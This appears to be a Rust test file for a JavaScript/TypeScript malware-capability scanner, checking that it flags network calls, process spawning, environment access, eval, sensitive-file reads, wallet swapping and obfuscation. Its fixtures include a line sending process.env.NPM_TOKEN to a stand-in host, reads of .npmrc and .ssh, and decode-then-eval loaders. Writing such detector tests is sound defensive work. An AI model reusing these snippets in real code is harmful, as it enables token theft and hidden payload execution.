use super::*;

fn facts(source: &str) -> FileFacts {
    extract(Grammar::JavaScript, source.as_bytes())
}

/// Each use as "CAPABILITY[/signal] detail @line top|deferred".
fn uses(f: &FileFacts) -> Vec<String> {
    let mut out: Vec<String> = f
        .uses
        .iter()
        .map(|u| {
            let signal = if u.signal.is_empty() {
                String::new()
            } else {
                format!("/{}", u.signal)
            };
            format!(
                "{}{signal} {} @{} {}",
                u.capability.as_str_name().trim_start_matches("CAPABILITY_"),
                u.detail,
                u.line,
                if u.top_level { "top" } else { "deferred" }
            )
        })
        .collect();
    out.sort();
    out
}

#[test]
fn every_grammar_loads() {
    for g in [Grammar::JavaScript, Grammar::TypeScript, Grammar::Tsx] {
        assert!(Parser::new().set_language(&language(g)).is_ok());
    }
}

#[test]
fn grammar_by_extension() {
    assert_eq!(grammar_for("lib/a.cjs"), Some(Grammar::JavaScript));
    assert_eq!(grammar_for("src/a.tsx"), Some(Grammar::Tsx));
    assert_eq!(grammar_for("src/a.mts"), Some(Grammar::TypeScript));
    assert_eq!(grammar_for("types/a.d.ts"), None);
    assert_eq!(grammar_for("dir.js/README"), None);
    assert_eq!(grammar_for("data.json"), None);
}

#[test]
fn resolves_requires_and_imports() {
    let f = facts(
        r#"
const cp = require('child_process');
const { request: get } = require("node:https");
import * as dns from 'dns';
import { exec as run } from 'child_process';
const net = require('n' + 'et');
cp.execSync('id');
get({ host: 'x' });
function later() { dns.lookup('x'); run('ls'); }
new net.Socket();
"#,
    );
    assert_eq!(
        uses(&f),
        [
            "NETWORK dns @4 deferred",
            "NETWORK dns.lookup @9 deferred",
            "NETWORK https @3 deferred",
            "NETWORK https.request @8 top",
            "NETWORK net @6 deferred",
            "NETWORK net.Socket @10 top",
            "PROCESS_SPAWN child_process @2 deferred",
            "PROCESS_SPAWN child_process @5 deferred",
            "PROCESS_SPAWN child_process.exec @9 deferred",
            "PROCESS_SPAWN child_process.execSync @7 top",
        ]
    );
    let specifiers: Vec<(&str, bool)> = f
        .imports
        .iter()
        .map(|i| (i.specifier.as_str(), i.top_level))
        .collect();
    assert!(specifiers.contains(&("node:https", true)));
    assert!(specifiers.contains(&("net", true)));
}

#[test]
fn globals_env_and_dynamic_code() {
    let f = facts(
        r#"
const t = process.env.NPM_TOKEN;
fetch('https://sinkhole.invalid/' + t);
window.eval('1');
(0, eval)('2');
global['ev' + 'al']('3');
new Function('return 4')();
setTimeout('5', 1);
setTimeout(() => {}, 1);
require(name);
process.binding('spawn_sync');
"#,
    );
    let got = uses(&f);
    for want in [
        "ENV_ACCESS process.env.NPM_TOKEN @2 top",
        "NETWORK fetch @3 top",
        "DYNAMIC_CODE eval @4 top",
        "DYNAMIC_CODE eval @5 top",
        "DYNAMIC_CODE eval @6 top",
        "DYNAMIC_CODE Function @7 top",
        "DYNAMIC_CODE setTimeout @8 top",
        "DYNAMIC_CODE require of a computed name @10 top",
        "PROCESS_SPAWN process.binding @11 top",
    ] {
        assert!(got.contains(&want.to_owned()), "missing {want}: {got:#?}");
    }
    assert!(!got.iter().any(|u| u.contains("@9")), "{got:#?}");
}

#[test]
fn top_level_follows_what_runs_on_load() {
    let f = facts(
        r#"
(function () { eval('a'); })();
!function () { eval('b'); }();
(function () { eval('c'); }).call(this);
[1].forEach(function () { eval('d'); });
function f() { eval('e'); }
const g = () => eval('f');
class C { m() { eval('g'); } static { eval('h'); } }
module.exports = function () { eval('i'); };
"#,
    );
    let got = uses(&f);
    let top: Vec<&str> = got
        .iter()
        .filter(|u| u.ends_with(" top"))
        .map(|u| &u[u.find('@').unwrap()..])
        .collect();
    assert_eq!(
        top,
        ["@2 top", "@3 top", "@4 top", "@5 top", "@8 top"],
        "{got:#?}"
    );
}

#[test]
fn sensitive_paths_and_wallets() {
    let f = facts(
        r#"
const p = path.join(os.homedir(), '.npmrc');
const k = "\x2e\x73\x73\x68";
const swap = ['0x52908400098527886E0F7030069857D2E4169EE7', '0x8617E340B3D01FA5F11F306F4090FD50E238070D', 'bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq'];
window.ethereum.request({ method: 'eth_sendTransaction' });
"#,
    );
    let got = uses(&f);
    for want in [
        "FS_SENSITIVE_READ npm: .npmrc @2 top",
        "FS_SENSITIVE_READ ssh: .ssh @3 top",
        "CRYPTO_WALLET 3 wallet addresses, first ethereum @4 top",
        "CRYPTO_WALLET ethereum.request @5 top",
    ] {
        assert!(got.contains(&want.to_owned()), "missing {want}: {got:#?}");
    }
}

#[test]
fn decode_then_execute() {
    let f = facts(
        r#"
eval(Buffer.from('ZXZhbA==', 'base64').toString());
const s = atob(payload);
const t = s.split('').reverse().join('');
function later() { new Function(t)(); }
const d = require('crypto').createDecipher('aes256', key);
let out = d.update(blob, 'hex', 'utf8');
out += d.final('utf8');
const m = new module.constructor();
m._compile(out, '');
eval('harmless');
"#,
    );
    let got = uses(&f);
    for want in [
        "OBFUSCATION/decode_exec base64 → eval @2 top",
        "OBFUSCATION/decode_exec atob → Function @5 deferred",
        "OBFUSCATION/decode_exec decryption → Module._compile @10 top",
    ] {
        assert!(got.contains(&want.to_owned()), "missing {want}: {got:#?}");
    }
    assert!(
        !got.iter()
            .any(|u| u.contains("decode_exec") && u.contains("@11")),
        "{got:#?}"
    );
}

#[test]
fn string_and_file_signals() {
    let blob = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODk"
        .repeat(4) + "=";
    let escaped = r"\x68".repeat(20);
    let ids: String = (0..30).map(|i| format!("var _0x{i:04x}=1;")).collect();
    let src = format!("const a = '{blob}';\nconst b = '{escaped}';\n{ids}\n");
    let got = uses(&facts(&src));
    for want in [
        "OBFUSCATION/encoded_blob base64, 333 characters @1 top",
        "OBFUSCATION/escaped_string 20 escapes in 20 characters @2 top",
        "OBFUSCATION/obfuscator_identifiers 30 _0x identifiers @3 top",
    ] {
        assert!(got.contains(&want.to_owned()), "missing {want}: {got:#?}");
    }
}

#[test]
fn minified_detection() {
    let long_line = "a=1;".repeat(1000);
    assert!(obfuscation::is_minified(long_line.as_bytes()));
    let normal = "const a = 1;\n".repeat(400);
    assert!(!obfuscation::is_minified(normal.as_bytes()));
}

#[test]
fn typescript_and_tsx_parse() {
    let ts = extract(
        Grammar::TypeScript,
        b"import cp = require('child_process');\nconst x: number = 1;\ncp.spawn('a');\n",
    );
    assert!(
        uses(&ts).contains(&"PROCESS_SPAWN child_process.spawn @3 top".to_owned()),
        "{:?}",
        uses(&ts)
    );
    let tsx = extract(
        Grammar::Tsx,
        b"import * as https from 'https';\nexport const A = () => <div>{https.get('x')}</div>;\n",
    );
    assert!(uses(&tsx).contains(&"NETWORK https.get @2 deferred".to_owned()));
}

#[test]
fn hostile_nesting_is_handled_quickly() {
    // Nesting is attacker-controlled: every walk must be iterative or capped, and linear, so
    // that burying a payload deep neither crashes the analyzer nor hides the payload.
    let depth = 20_000;
    let started = std::time::Instant::now();
    let src = format!(
        "{}eval(x){};\nconst s = {}'a';\n",
        "(function(){".repeat(depth),
        "})()".repeat(depth),
        "'a'+".repeat(depth),
    );
    let f = facts(&src);
    assert!(f.problem.is_none(), "{:?}", f.problem);
    assert!(
        uses(&f).contains(&"DYNAMIC_CODE eval @1 top".to_owned()),
        "{:?}",
        uses(&f)
    );
    let chain = facts(&format!("process.env{}();\n", ".b".repeat(depth)));
    assert!(chain.problem.is_none());
    assert!(
        started.elapsed() < std::time::Duration::from_secs(10),
        "{:?}",
        started.elapsed()
    );
}
